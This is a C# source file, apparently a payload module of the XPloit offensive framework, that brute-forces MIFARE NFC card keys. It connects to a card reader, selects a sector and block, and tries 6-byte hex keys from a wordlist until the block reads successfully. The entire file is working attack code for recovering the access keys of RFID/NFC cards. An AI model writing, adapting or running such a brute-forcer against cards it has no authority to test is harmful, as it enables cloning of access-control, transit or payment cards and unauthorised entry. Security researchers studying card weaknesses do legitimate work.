using Auxiliary.Local;
using Auxiliary.Local.NFC;
using System;
using Xploit.Core.Rfid.Enums;
using Xploit.Core.Rfid.Interfaces;
using Xploit.Core.Rfid.Mifare;
using XPloit.Core;
using XPloit.Core.Enums;
using XPloit.Helpers;
using XPloit.Helpers.Attributes;
using XPloit.Rfid;

namespace Payloads.Local.BruteForce.NFC
{
    public class BruteForceNFCMifare : Payload, WordListBruteForce.ICheckPassword
    {
        Target[] _Targets = null;

        #region Configure
        public override string Author { get { return "Fernando Díaz Toledano"; } }
        public override string Description { get { return "Mifare bruteforce"; } }
        public override Reference[] References
        {
            get { return new Reference[] { new Reference(EReferenceType.URL, "https://en.wikipedia.org/wiki/MIFARE"), }; }
        }
        #endregion

        #region Properties
        [ConfigurableProperty(Description = "Key for type for login")]
        public ConfigMifareRead.EKeyType KeyType { get; set; }
        [ConfigurableProperty(Description = "Set reader index")]
        public byte Reader { get; set; }

        [ConfigurableProperty(Description = "Sector for attack")]
        public byte AttackInSectorNum { get; set; }
        [ConfigurableProperty(Description = "Block for attack")]
        public ConfigMifareReadSector.EBlockRange AttackInBlock { get; set; }
        #endregion

        CardReaderCollection _Readers = null;
        CardReader _Reader = null;
        CardMifare _Card = null;
        ConfigMifareRead _Config = new ConfigMifareRead();

        /// <summary>
        /// Constructor
        /// </summary>
        public BruteForceNFCMifare()
        {
            KeyType = ConfigMifareRead.EKeyType.A;
            AttackInSectorNum = 10;
            AttackInBlock = ConfigMifareReadSector.EBlockRange.DataBlock01;
        }

        public bool PreRun()
        {
            PostRun();

            _Config.ReadSectors[AttackInSectorNum].ReadDataBlockStart = AttackInBlock;
            _Config.ReadSectors[AttackInSectorNum].ReadDataBlockEnd = AttackInBlock;
            _Config.ReadSectors[AttackInSectorNum].ReadTrailBlock = false;
            _Config.ReadSectors[AttackInSectorNum].Login = new LoginMifareMethod()
            {
                KeyNum = ConfigMifareRead.EKeyNum.One,
                KeyType = KeyType
            };

            if (_Targets == null)
                _Targets = MifareRestoreClone.LoadReaders();

            if (_Targets == null)
            {
                WriteError("Not readers detected");
                return false;
            }

            if (Reader < 0 || Reader >= _Targets.Length)
            {
                WriteInfo("Please select one of this readers in 'Reader' option");

                int ix = 0;
                foreach (Target t in _Targets)
                {
                    WriteInfo(ix.ToString() + " - " + t.Name);
                    ix++;
                }

                return false;
            }

            _Readers = new CardReaderCollection();
            _Reader = _Readers[_Targets[0].Name];

            if (_Readers == null)
            {
                WriteError("Not readers detected");
                return false;
            }

            switch (_Reader.Connect())
            {
                case EConnection.Ok: break;
                case EConnection.NotCard:
                    {
                        WriteError("Not card present, please insert a card");
                        break;
                    }
            }

            ICard ic;
            if (!_Reader.GetCard(out ic, null))
            {
                WriteError("Error while getting card");
                return false;
            }

            if (ic == null)
            {
                WriteError("Please insert a card");
                return false;
            }

            WriteInfo("Card id ..........", ic.Id.ToString(), ConsoleColor.Cyan);
            WriteInfo("Card type ........", ic.Type.ToString(), ConsoleColor.Cyan);

            if (!(ic is CardMifare))
            {
                WriteError("Card not is mifare");
                return false;
            }

            _Card = (CardMifare)ic;
            WriteInfo("Mifare type ......", _Card.MifareType.ToString(), ConsoleColor.Cyan);
            _Card.InitCard();

            return true;
        }
        public void PostRun()
        {
            if (_Reader != null)
            {
                _Reader.Dispose();
                _Reader = null;
            }
            if (_Readers != null)
            {
                _Readers.Dispose();
                _Readers = null;
            }
        }

        public bool CheckPassword(string password)
        {
            byte[] key = HexHelper.FromHexString(password);
            if (key.Length != 6) throw (new Exception("Password error in (6 bytes): " + password));

            _Config.KeysOne = key;
            //_Config.KeysZero = key;

            ICard ic;
            if (_Reader.GetCard(out ic, _Card.Atr, _Config))
            {
                CardMifare card = (CardMifare)ic;
                if (card.Sectors[AttackInSectorNum].DataBlocks[(byte)AttackInBlock].IsReaded)
                    return true;
            }

            return false;
        }
    }
}